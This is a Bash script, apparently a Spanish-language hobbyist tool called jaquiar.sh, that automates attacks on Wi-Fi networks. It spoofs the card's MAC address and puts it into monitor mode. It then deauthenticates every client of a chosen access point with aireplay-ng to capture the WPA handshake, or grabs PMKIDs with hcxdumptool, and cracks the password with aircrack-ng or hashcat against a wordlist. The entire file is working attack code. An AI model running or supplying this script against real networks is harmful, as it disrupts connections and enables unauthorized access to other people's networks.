#!/bin/bash
# Author: Gatovsky
#
#
# Colors
greenColor="\e[0;32m\033[1m"
endColor="\033[0m\e[0m"
redColor="\e[0;31m\033[1m"
blueColor="\e[0;34m\033[1m"
yellowColor="\e[0;33m\033[1m"
purpleColor="\e[0;35m\033[1m"
turquoiseColor="\e[0;36m\033[1m"
greyColor="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive  # evita la ventana interactiva en la terminal a la hora de instalar

trap ctrl_c INT

function ctrl_c {
	echo -e "\n${yellowColor}[*]${endcolor}${greyColor}Saliendo${endColor}"
	tput cnorm  # coloca el cursor normal
	airmon-ng stop ${network_card}mon >& /dev/null  # detiene el modo monitor de la tarjeta
	exit 0
}

#sleep 6

# function help panel 
function helpPanel {
	clear
	echo -e "\n${yellowColor}[*]${endColor}${greyColor} Uso: ./jaquiar.sh${endColor}\n"
	echo -e "\t${purpleColor}a)${endColor}${yellowColor} Modo de ataques${endColor}"
	echo -e "\t\t${redColor}Handshake${endColor}"
	echo -e "\t\t${redColor}PKMID${endColor}"
	echo -e "\t${purpleColor}n)${endColor}${yellowColor} Tarjeta de red${endColor}"
	echo -e "\t${purpleColor}h)${endColor}${yellowColor} Mostrar panel de ayuda${endColor}"
	exit 0
}


# install dependencies
function dependencies {
	tput civis  # pone el cursos invisible
	clear; dependencies=(aircrack-ng macchanger)
	echo -e "${yellowColor}[*]${endColor}${greyColor} Comprobando dependecias...${endColor}"
	sleep 2

	for program in ${dependencies[*]}; do
		echo -ne "\n${yellowColor}[*]${endColor}${blueColor} Herramienta${endColor}${purpleColor} $program${endColor}${blueColor}... ${endColor}"
		
		test -f /usr/bin/$program 
		if [[ "$(echo $?)" == "0" ]]; then
			echo -e "${greenColor}(V)${endColor}"
		else
			echo -e "${redColor}(X)${endColor}\n"
			echo -e "${yellowColor}[*]${endColor}${greyColor} Instalando herramienta ${endColor}${blueColor}$program${endColor}${yellowColor}...${endColor}"
			apt install $program -y >& /dev/null  # Redirige el error y salida estándar a null 
		fi; sleep 1
	done

}


function startAttack {
	clear
	echo -e "${yellowColor}[*]${endColor}${greyColor} Configurando tarjeta de red...${endColor}\n"
	# iniciando modo monitor
	airmon-ng start $network_card >& /dev/null
	# dar de baja tarjeta de red
	ifconfig ${network_card}mon dow && macchanger -a ${network_card}mon >& /dev/null
	# dar de alta la nueva tarjeta de red
	ifconfig ${network_card}mon up 
	# manejar procesos conflictivos
	killall dhclient wpa_supplicant 2> /dev/null
		
	echo -e "${yellowColor}[*]${endColor}${greyColor} Nueva dirección MAC asignada ${endColor}${purpleColor}[${endColor}${blueColor}$(macchanger -s ${network_card}mon | grep -i current | xargs | cut -d ' ' -f '3-10')${endColor}${purpleColor}]${endColor}"

	if [[ "$(echo $attack_mode)" == "Handshake" ]]; then
		clear
		# poner targeta en modo monitor
		xterm -hold -e "airodump-ng ${network_card}mon" &
		# captura del proceso ID *Tenga en cuenta que $! solo captura PID en segundo plano*
		airodump_xterm_PID=$!
		echo -ne "${yellowColor}[*]${endColor}${greyColor} Nombre del punto de acceso: ${endColor}" && read app_name
		echo -ne "${yellowColor}[*]${endColor}${greyColor} Canal del punto de acceso: ${endColor}" && read app_chanel
		
                # matar proceso airodump
		kill -9 $airodump_xterm_PID; wait $airodump_xterm_PID >& /dev/null
		# filtrar
		xterm -hold -e "airodump-ng -c $app_chanel -w Captura --essid $app_name ${network_card}mon" &
		# recuperar proceso ID 
		airodump_filter_xterm_PID=$!
		
		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $app_name -c FF:FF:FF:FF:FF:FF ${network_card}mon" &
		arieplay_xterm_PID=$!
		sleep 10; kill -9 $arieplay_xterm_PID; wait $arieplay_xterm_PID >& /dev/null
		sleep 10; kill -9 $airodump_filter_xterm_PID; wait $airodump_filter_xterm_PID >& /dev/null
		# Romper cifrado contraseña
		xterm -hold -e "aircrack-ng -w /usr/share/OneListForAll/onelistforallmicro.txt Captura-01.cap" &

	elif [[ "$(echo $attack_mode)" == "PKMID" ]]; then
		clear
		echo -ne "${yellowColor}[*]${endColor}${greyColor} Iniciando ClientLess PKMID attack... ${endColor}\n"
		sleep 2
		timeout 60 bash -c "hcxdumptool -i ${network_card}mon --enable_status=1 -c 8 -o Captura"
		sleep 2
		echo -ne "${yellowColor}[*]${endColor}${greyColor} Obteniendo Hashes... ${endColor}\n"
		hcxpcapngtool -o myHashes Captura; rm Captura >& /dev/null
		sleep 2

		test -f myHashes
		if [[ "$(echo $?)" == "0" ]]; then
			echo -ne "${yellowColor}[*]${endColor}${greyColor} Iniciando proceso de fuerza bruta... ${endColor}\n"
			hashcat -m 16800 /usr/share/OneListForAll/onelistforallmicro.txt myHashes -d 1 --force
		else
			echo -ne "${redColor}[!]${endColor}${greyColor} No se ha podido capturar ningún paquete... ${endColor}\n"
		fi


	else
		echo -e "\n${redColor}[*]${endColor}${yellowColor} Opción no válida ${endColor}\n"
	fi


}


##### MAIN FUNCTION #####
if [[ $(id -u) == 0 ]]; then
	# declare -i acota espacio en memoria
	declare -i parameter_counter=0
	while getopts ":a:n:h" arg; do
		case $arg in
			"a") attack_mode=$OPTARG; let parameter_counter+=1 ;;
			"n") network_card=$OPTARG; let parameter_counter+=1 ;;
			"h") helpPanel ;;
		esac
	done
	
	# Verifica si el programa se está ejecutando correctamente
	if [[ $parameter_counter -ne 2 ]]; then
		helpPanel
	else
		dependencies
		startAttack
		tput cnorm  # coloca el cursor normal
		airmon-ng stop ${network_card}mon >& /dev/null  # detiene el modo monitor de la tarjeta
	fi


else
	echo -e "\n${redColor}[*] No soy root ${endColor}\n"
fi

